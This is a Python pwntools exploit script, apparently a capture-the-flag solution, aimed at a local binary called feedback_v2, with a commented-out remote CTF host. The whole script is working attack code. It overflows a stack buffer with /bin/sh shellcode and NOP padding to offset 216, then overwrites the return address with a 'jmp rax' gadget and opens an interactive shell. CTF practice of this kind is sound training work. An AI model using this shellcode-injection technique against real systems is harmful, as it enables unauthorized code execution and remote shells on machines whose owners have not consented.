#!/bin/python3

from pwn import *

binary = '../gen/feedback_v2'
#elf = ELF(binary)

# p = remote('direccion.ip', puerto)
#p = remote("ctf.hackademics-forum.com", 51425)

p=process(binary)

# p = gdb.debug(binary, '''
#     break *comment+61
#     continue
# ''')

#0x00000000004010cc: jmp rax;
jmp_addr = 0x4010cc

#0x0000000000401016 : ret
ret = 0x401016

shellcode = asm(shellcraft.amd64.linux.sh(),arch='amd64')

offset = 216
padding = b'\x90' * (offset-len(shellcode))

payload = shellcode + padding + p64(jmp_addr)

#payload = b'\x90'*(offset) + p64(0x401690) + p64(jmp_addr)

print(payload)

log.info("Enviando exploit...")

p.sendline(payload)

p.interactive()
